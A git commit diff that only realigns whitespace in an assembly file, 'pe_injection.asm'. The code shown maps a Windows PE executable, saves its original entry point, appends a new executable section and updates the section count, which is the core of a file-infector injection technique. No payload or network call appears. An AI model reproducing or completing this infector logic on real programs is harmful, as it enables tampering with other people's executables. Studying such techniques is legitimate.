0ed5948e38045e8323e070fbb8828b9df22a117e
Bạch Ngọc Hưng <45124700+tomchuoi@users.noreply.github.com>
2024-04-19 06:23:05 -0700

    Align the code

--- Injection/pe_injection.asm
+++ Injection/pe_injection.asm
@@ -57,7 +57,7 @@ start:
     ; Check if mapping handle is valid
     cmp eax, NULL
     je  error_exit
-    Mov Ecx, Eax 						; ecx = mapping handle
+    Mov Ecx, Eax 			; ecx = mapping handle
     Mov fileMapping, Eax
 
     ; Get the address of the mapped file
@@ -65,12 +65,12 @@ start:
     ; Check if mapping address is valid
     cmp eax, NULL
     je  error_exit
-    Mov Ebx, Eax 						; ebx = base address of the mapped file
+    Mov Ebx, Eax 			; ebx = base address of the mapped file
     Mov viewOfFile, Eax
 
     Mov Edi, Ebx
     Add Edi, DWord Ptr [Edi + 3CH]
-    Mov NT_Header, Edi					; Save the offset of NT_Header from edi register
+    Mov NT_Header, Edi			; Save the offset of NT_Header from edi register
 
     Mov Ebx, Edi
     Add Ebx, 18H                        ; Move to OptionalHeader
@@ -80,94 +80,94 @@ start:
     Mov Ecx, [Esi]
     Mov imageBase, Ecx
 
-    Add Esi, 4H							; Move to SectionAlignment field
+    Add Esi, 4H				; Move to SectionAlignment field
     Mov Ecx, [Esi]
     Mov sectionAlignment, Ecx
 
     Add Esi, 4H
     Mov Ecx, [Esi]
-    Mov fileAlignment, Ecx				; Move to FileAlignment field
+    Mov fileAlignment, Ecx		; Move to FileAlignment field
 
-    Add Esi, 14H						; Move to SizeOfImage field
+    Add Esi, 14H			; Move to SizeOfImage field
     Mov Ecx, [Esi]
     Mov sizeOfImage, Ecx
 
     Mov Ecx, DWord Ptr [Ebx + 10H]      ; Get the AddressOfEntryPoint
     Mov AddressOfEntryPoint, Ecx
-  	Xor Eax, Eax
-  	Mov Eax, AddressOfEntryPoint
-  	Add Eax, imageBase					; JmpBackEntryPoint = AddressOfEntryPoint + imageBase
-  	Mov JmpBackEntryPoint, Eax
+    Xor Eax, Eax
+    Mov Eax, AddressOfEntryPoint
+    Add Eax, imageBase				; JmpBackEntryPoint = AddressOfEntryPoint + imageBase
+    Mov JmpBackEntryPoint, Eax
 
     ; Calculate the offset of the last section's raw data from the beginning of the file
-    Mov Esi, DWord Ptr [NT_Header]				; Get the pointer to the NT Header
+    Mov Esi, DWord Ptr [NT_Header]		; Get the pointer to the NT Header
     Add Esi, 6H                                 ; Move to the NumberOfSections field
     Xor Eax, Eax
     Mov Eax, [Esi]                              ; Load the number of sections
     Mov NumberOfSections, Ax
     Sub Ax, 1
-  	Mov Edi, DWord Ptr [OptionalHeader]
-  	Add Edi, SIZEOF_OPTIONAL_HEADER
-  	Mov Bx, 40
-  	IMul Ax, Bx
-  	Movzx Eax, Ax
-  	Add Edi, Eax								; File pointer point to the last section in the section table
+    Mov Edi, DWord Ptr [OptionalHeader]
+    Add Edi, SIZEOF_OPTIONAL_HEADER
+    Mov Bx, 40
+    IMul Ax, Bx
+    Movzx Eax, Ax
+    Add Edi, Eax				; File pointer point to the last section in the section table
   
-  	Add Edi, 8H									; Get the VirtualSize of the last section
-  	Mov Eax, [Edi]
-  	Mov lastSection.Misc.VirtualSize, Eax
+    Add Edi, 8H					; Get the VirtualSize of the last section
+    Mov Eax, [Edi]
+    Mov lastSection.Misc.VirtualSize, Eax
   
-  	Add Edi, 4H									; Get the VirtualAddress of the last section
-  	Mov Eax, [Edi]
-  	Mov lastSection.VirtualAddress, Eax
+    Add Edi, 4H				 	; Get the VirtualAddress of the last section
+    Mov Eax, [Edi]
+    Mov lastSection.VirtualAddress, Eax
   
-  	Add Edi, 4H
-  	Mov Eax, [Edi]
-  	Mov lastSection.SizeOfRawData, Eax
+    Add Edi, 4H
+    Mov Eax, [Edi]
+    Mov lastSection.SizeOfRawData, Eax
   
-  	Add Edi, 4H
-  	Mov Eax, [Edi]
-  	Mov lastSection.PointerToRawData, Eax
+    Add Edi, 4H
+    Mov Eax, [Edi]
+    Mov lastSection.PointerToRawData, Eax
   
-  	; Calculate new section information
-  	Mov Eax, IMAGE_SCN_MEM_READ_CODE_EXECUTE
-  	Mov newSection.Characteristics, Eax
+    ; Calculate new section information
+    Mov Eax, IMAGE_SCN_MEM_READ_CODE_EXECUTE
+    Mov newSection.Characteristics, Eax
   
-  	Mov Eax, lastSection.PointerToRawData
-  	Mov Ebx, lastSection.SizeOfRawData
-  	Add Eax, Ebx
-  	Mov newSection.PointerToRawData, Eax
+    Mov Eax, lastSection.PointerToRawData
+    Mov Ebx, lastSection.SizeOfRawData
+    Add Eax, Ebx
+    Mov newSection.PointerToRawData, Eax
   
-  	Mov Eax, sectionAlignment
-  	Dec Eax
-  	Not Eax
-  	And Eax, sectionAlignment
-  	Mov Ebx, lastSection.Misc.VirtualSize
-  	Add Ebx, Eax
-  	Mov Eax, lastSection.VirtualAddress
-  	Add Ebx, Eax
-  	Mov newSection.VirtualAddress, Ebx
+    Mov Eax, sectionAlignment
+    Dec Eax
+    Not Eax
+    And Eax, sectionAlignment
+    Mov Ebx, lastSection.Misc.VirtualSize
+    Add Ebx, Eax
+    Mov Eax, lastSection.VirtualAddress
+    Add Ebx, Eax
+    Mov newSection.VirtualAddress, Ebx
   
-  	Mov Eax, 6362612EH
-  	Mov DWord Ptr [newSection.Name1], Eax
+    Mov Eax, 6362612EH
+    Mov DWord Ptr [newSection.Name1], Eax
   
-  	Mov Ax, NumberOfSections
-  	Mov Edi, DWord Ptr [OptionalHeader]
-  	Add Edi, SIZEOF_OPTIONAL_HEADER
-  	Mov Bx, 40
-  	IMul Ax, Bx
-  	Movzx Eax, Ax
-  	Add Edi, Eax								; Move the pointer to the end of the section table
-  	Sub Edi, viewOfFile
-  	Invoke SetFilePointer, fileHandle, Edi, NULL, FILE_BEGIN
-  	Invoke WriteFile, fileHandle, Offset newSection, SizeOf newSection, Addr BytesWritten, NULL
+    Mov Ax, NumberOfSections
+    Mov Edi, DWord Ptr [OptionalHeader]
+    Add Edi, SIZEOF_OPTIONAL_HEADER
+    Mov Bx, 40
+    IMul Ax, Bx
+    Movzx Eax, Ax
+    Add Edi, Eax								; Move the pointer to the end of the section table
+    Sub Edi, viewOfFile
+    Invoke SetFilePointer, fileHandle, Edi, NULL, FILE_BEGIN
+    Invoke WriteFile, fileHandle, Offset newSection, SizeOf newSection, Addr BytesWritten, NULL
 
-	; Write the updated number of sections back to the file
+    ; Write the updated number of sections back to the file
     Mov Esi, DWord Ptr [NT_Header]
     Add Esi, 6H
     Mov Eax, [Esi]      				; Move to the number of sections
     Inc Eax             				; Increment the number of sections
-    Mov NumberOfSections, Ax 			; Load the updated value
+    Mov NumberOfSections, Ax 				; Load the updated value
     Sub Esi, viewOfFile					; Get the actual offset on the disk
     Invoke SetFilePointer, fileHandle, Esi, NULL, FILE_BEGIN ; Set file pointer to the location of NumberOfSections
     Invoke WriteFile, fileHandle, Offset NumberOfSections, SizeOf Word, Addr BytesWritten, NULL ; Write the updated value
